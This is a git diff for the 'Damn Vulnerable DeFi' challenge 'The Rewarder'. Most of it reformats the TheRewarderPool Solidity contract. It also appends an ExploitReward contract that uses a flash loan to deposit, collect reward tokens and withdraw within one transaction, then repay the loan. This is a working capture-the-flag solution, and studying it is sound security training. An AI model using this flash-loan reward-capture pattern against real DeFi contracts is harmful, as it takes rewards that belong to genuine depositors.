@@ -5,6 +5,7 @@ pragma solidity ^0.8.0;
 import "./RewardToken.sol";
 import "../DamnValuableToken.sol";
 import "./AccountingToken.sol";
+import "./FlashLoanerPool.sol";
 
 /**
  * @title TheRewarderPool
@@ -12,7 +13,6 @@ import "./AccountingToken.sol";
 
  */
 contract TheRewarderPool {
-
     // Minimum duration of each round of rewards in seconds
     uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
 
@@ -27,7 +27,7 @@ contract TheRewarderPool {
     // Token used for internal accounting and snapshots
     // Pegged 1:1 with the liquidity token
     AccountingToken public accToken;
-    
+
     // Token in which rewards are issued
     RewardToken public immutable rewardToken;
 
@@ -48,12 +48,16 @@ contract TheRewarderPool {
      */
     function deposit(uint256 amountToDeposit) external {
         require(amountToDeposit > 0, "Must deposit tokens");
-        
+
         accToken.mint(msg.sender, amountToDeposit);
         distributeRewards();
 
         require(
-            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
+            liquidityToken.transferFrom(
+                msg.sender,
+                address(this),
+                amountToDeposit
+            )
         );
     }
 
@@ -65,23 +69,28 @@ contract TheRewarderPool {
     function distributeRewards() public returns (uint256) {
         uint256 rewards = 0;
 
-        if(isNewRewardsRound()) {
+        if (isNewRewardsRound()) {
             _recordSnapshot();
-        }        
-        
-        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
-        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);
+        }
+
+        uint256 totalDeposits = accToken.totalSupplyAt(
+            lastSnapshotIdForRewards
+        );
+        uint256 amountDeposited = accToken.balanceOfAt(
+            msg.sender,
+            lastSnapshotIdForRewards
+        );
 
         if (amountDeposited > 0 && totalDeposits > 0) {
-            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
+            rewards = (amountDeposited * 100 * 10**18) / totalDeposits;
 
-            if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
+            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                 rewardToken.mint(msg.sender, rewards);
                 lastRewardTimestamps[msg.sender] = block.timestamp;
             }
         }
 
-        return rewards;     
+        return rewards;
     }
 
     function _recordSnapshot() private {
@@ -91,13 +100,60 @@ contract TheRewarderPool {
     }
 
     function _hasRetrievedReward(address account) private view returns (bool) {
-        return (
-            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
-            lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
-        );
+        return (lastRewardTimestamps[account] >=
+            lastRecordedSnapshotTimestamp &&
+            lastRewardTimestamps[account] <=
+            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION);
     }
 
     function isNewRewardsRound() public view returns (bool) {
-        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+        return
+            block.timestamp >=
+            lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+    }
+}
+
+contract ExploitReward {
+    FlashLoanerPool public pool;
+    DamnValuableToken public token;
+    TheRewarderPool public rewardPool;
+    RewardToken public rewardToken;
+
+    constructor(
+        address _pool,
+        address _token,
+        address _rewardPool,
+        address _rewardToken
+    ) {
+        pool = FlashLoanerPool(_pool);
+        token = DamnValuableToken(_token);
+        rewardPool = TheRewarderPool(_rewardPool);
+        rewardToken = RewardToken(_rewardToken);
+    }
+
+    fallback() external payable {
+        // Get the balance of the DVT that flash loan gave
+        uint256 dvtBalance = token.balanceOf(address(this));
+
+        // Approve allowance for this balance
+        token.approve(address(rewardPool), dvtBalance);
+
+        // Deposit so the rewards are distributed again
+        rewardPool.deposit(dvtBalance);
+
+        // Immediately withdraw
+        rewardPool.withdraw(dvtBalance);
+
+        // Transfer the token back to the pool
+        // in order to have a successfull flash loan
+        token.transfer(address(pool), dvtBalance);
+    }
+
+    function attack() public {
+        // Request the flash loan with the balance of the flash loan pool
+        pool.flashLoan(token.balanceOf(address(pool)));
+
+        // Transfer all the rewards to me
+        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
     }
 }
